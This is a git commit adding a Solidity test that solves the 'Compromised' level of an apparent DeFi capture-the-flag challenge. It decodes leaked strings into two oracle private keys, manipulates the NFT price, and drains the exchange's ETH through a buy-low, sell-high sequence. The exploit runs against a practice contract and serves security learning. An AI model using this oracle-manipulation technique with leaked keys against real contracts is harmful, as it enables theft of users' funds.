7c31a3269d0508b1ccd7e2f58e666c60a74629b7
0502lian <28177408@qq.com>
2024-04-15 11:51:21 +0800

    finish compromised

--- test/Levels/compromised/Compromised.t.sol
+++ test/Levels/compromised/Compromised.t.sol
@@ -57,25 +57,55 @@ contract Compromised is Test {
         }
 
         // Deploy the oracle and setup the trusted sources with initial prices
-        trustfulOracle = new TrustfulOracleInitializer(
-            sources,
-            symbols,
-            initialPrices
-        ).oracle();
+        trustfulOracle = new TrustfulOracleInitializer(sources, symbols, initialPrices).oracle();
 
         // Deploy the exchange and get the associated ERC721 token
-        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
-            address(trustfulOracle)
-        );
+        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(trustfulOracle));
         damnValuableNFT = exchange.token();
 
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
+    function testExploitCompromised() public {
         /**
          * EXPLOIT START *
          */
+
+        //4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
+        //to text: MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
+        //decode base64: 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
+        address addr1 = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
+        console.log(addr1);
+
+        //4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
+        //to text: MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
+        //decode base64:0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
+        address addr2 = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);
+        console.log(addr2);
+
+        //attack price
+        vm.prank(addr1);
+        trustfulOracle.postPrice("DVNFT", 0.01 ether);
+        vm.prank(addr2);
+        trustfulOracle.postPrice("DVNFT", 0.01 ether);
+        //buy
+        vm.prank(attacker);
+        uint256 tokenId = exchange.buyOne{value: 0.01 ether}();
+        //set price to max
+        vm.prank(addr1);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + 0.01 ether);
+        vm.prank(addr2);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + 0.01 ether);
+        //sell
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        vm.stopPrank();
+        //set price back
+        vm.prank(addr1);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank(addr2);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
 
         /**
          * EXPLOIT END *
